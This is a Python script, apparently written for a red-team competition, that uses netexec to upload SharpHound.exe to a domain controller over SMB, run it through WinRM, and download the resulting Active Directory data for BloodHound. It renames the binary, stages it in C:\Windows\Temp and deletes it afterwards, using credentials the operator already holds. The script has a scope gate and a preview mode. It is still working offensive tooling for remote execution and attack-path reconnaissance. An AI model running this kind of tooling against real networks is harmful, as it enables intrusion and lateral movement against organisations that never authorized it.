#!/usr/bin/env python3
"""
red/sharphound_deploy.py

Collects AD data with SharpHound for later analysis in BloodHound, against
an in-scope domain controller (thehouse) you already have valid credentials
for. Builds on top of netexec: uploads SharpHound.exe over SMB, executes it
over WinRM, then pulls the resulting zip back over SMB.

This is a collection tool, not an exploit — it only queries AD the way any
authenticated domain user normally can (LDAP reads of users/groups/ACLs).
It requires working credentials you've already obtained within the
competition's rules; it does not obtain credentials itself.

Pre-req: download SharpHound.exe once ahead of time (open source, from the
BloodHound project) and place it at tools/SharpHound.exe — this wrapper
does not fetch it live mid-comp.

Install BloodHound + Neo4j locally (or on a teammate's machine) ahead of
time so you can actually open and explore the collected data once you
have it — collection without a way to view it is wasted time.

Usage (preview):
    python3 red/sharphound_deploy.py --scope config/local/scope.json \\
        --target 172.16.XX.50 --username jalapeno --password 'Summer2026!'

Usage (actually run):
    python3 red/sharphound_deploy.py --scope config/local/scope.json \\
        --target 172.16.XX.50 --username jalapeno --password 'Summer2026!' \\
        --run --grace-ended --provided-kali
"""

import argparse
import shlex
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, "red")
from scope_gate import add_common_args, require_authorized_target  # noqa: E402

REMOTE_DIR = "C:\\Windows\\Temp"
REMOTE_EXE = f"{REMOTE_DIR}\\sh_review.exe"
REMOTE_OUT_GLOB = f"{REMOTE_DIR}\\*_BloodHound.zip"


def build_commands(target: str, username: str, password: str, local_sharphound: str, out_dir: str, collection_method: str) -> list:
    upload_cmd = [
        "netexec", "smb", target,
        "-u", username, "-p", password,
        "--put-file", local_sharphound, REMOTE_EXE,
    ]

    run_cmd = [
        "netexec", "winrm", target,
        "-u", username, "-p", password,
        "-x", f'{REMOTE_EXE} -c {collection_method} --outputdirectory {REMOTE_DIR}',
    ]

    download_cmd = [
        "netexec", "smb", target,
        "-u", username, "-p", password,
        "--get-file", REMOTE_OUT_GLOB, f"{out_dir}/",
    ]

    cleanup_cmd = [
        "netexec", "winrm", target,
        "-u", username, "-p", password,
        "-x", f'Remove-Item -Path "{REMOTE_EXE}" -Force -ErrorAction SilentlyContinue',
    ]

    return [upload_cmd, run_cmd, download_cmd, cleanup_cmd]


def main() -> int:
    parser = argparse.ArgumentParser(description="Gated SharpHound collection wrapper for an in-scope AD DC you already have creds for.")
    add_common_args(parser)
    parser.add_argument("--username", required=True, help="Valid domain username")
    parser.add_argument("--password", required=True, help="Password for --username")
    parser.add_argument("--local-sharphound", default="tools/SharpHound.exe", help="Local path to a pre-downloaded SharpHound.exe (default tools/SharpHound.exe)")
    parser.add_argument("--out-dir", default="reports/sharphound", help="Local directory to save the collected zip into (default reports/sharphound)")
    parser.add_argument("--collection-method", default="All", help="SharpHound collection method (default 'All' — use a narrower method like 'DCOnly' if the DC looks fragile)")
    args = parser.parse_args()

    target = require_authorized_target(args)

    if not Path(args.local_sharphound).is_file():
        sys.exit(
            f"[BLOCKED] {args.local_sharphound} not found. Download SharpHound.exe ahead of time "
            f"from the BloodHound project and place it there — this wrapper won't fetch it live mid-comp."
        )

    Path(args.out_dir).mkdir(parents=True, exist_ok=True)
    commands = build_commands(target, args.username, args.password, args.local_sharphound, args.out_dir, args.collection_method)

    for cmd in commands:
        print("Command:", " ".join(shlex.quote(c) for c in cmd))

    if not args.run:
        print("\n[PREVIEW MODE] Nothing executed. 'All' collection can be noisy/slow against a single DC — "
              "consider --collection-method DCOnly if you want something faster and lighter.")
        return 0

    for cmd in commands:
        try:
            subprocess.run(cmd, check=True)
        except FileNotFoundError:
            sys.exit("[ERROR] netexec not found on this machine. Install it on the provided Kali box first.")
        except subprocess.CalledProcessError as e:
            print(f"[WARN] step exited with status {e.returncode} — continuing to next step.")

    print(f"\nIf collection succeeded, open the zip in {args.out_dir} with BloodHound (ingest it there) to explore paths.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
